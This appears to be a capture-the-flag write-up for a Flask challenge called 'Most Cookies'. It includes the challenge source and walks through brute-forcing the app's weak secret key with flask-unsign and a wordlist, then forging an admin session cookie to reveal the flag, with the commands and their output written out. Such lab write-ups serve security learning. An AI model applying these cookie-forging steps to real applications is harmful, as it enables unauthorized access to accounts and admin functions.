# Overview 
<img width="1920" height="931" alt="Screenshot_2025-09-29_10-31-31" src="https://github.com/user-attachments/assets/64087840-bbf6-4e58-8d77-ab63f6a3d2aa" />

# Actions
Here is the source code provided
```
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()

```
and these are possiple cookie names, which can potentially be a secret key. 
<img width="853" height="94" alt="Screenshot_2025-09-29_10-30-53" src="https://github.com/user-attachments/assets/6c0e2a4b-06ce-4fb0-8d3f-1f63596a59a0" />


For this room, I use the tool called `flask_unsign`
How to set up `flask_unsign`
```
sudo apt install pipx
pipx install flask_unsign
```
Or you can just use `pip3` 
The next thing is get the cookie token via `BurpSuite`
<img width="802" height="307" alt="Screenshot_2025-09-29_10-49-56" src="https://github.com/user-attachments/assets/8877b150-d97d-41c1-bc88-27f8168d5ab7" />

Now,, it is time to use `flask_unsign`
```
flask-unsign --decode -c  'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aNlBQg.gRqWlBcHQX5XJ1-7cpWuLGfUKpA'                                   
{'very_auth': 'snickerdoodle'}
```
Extract all the cookie names into a list then use that list to find the secret key
```
flask-unsign --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aNlBQg.gRqWlBcHQX5XJ1-7cpWuLGfUKpA' --wordlist  keys.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 27 attemptscadamia
'gingersnap'
```
Next, I am going to forge a new token using the same tool
```
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'gingersnap'                                                   
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aNndmw.h0_41Y-TmfQMZPhALSXbQ5TKUNs
```
<img width="1920" height="1080" alt="Screenshot_2025-09-29_11_18_39" src="https://github.com/user-attachments/assets/9313c318-ad87-45ad-ad79-43d6284c7b54" />

Done!!! Happy Hacking!!!!

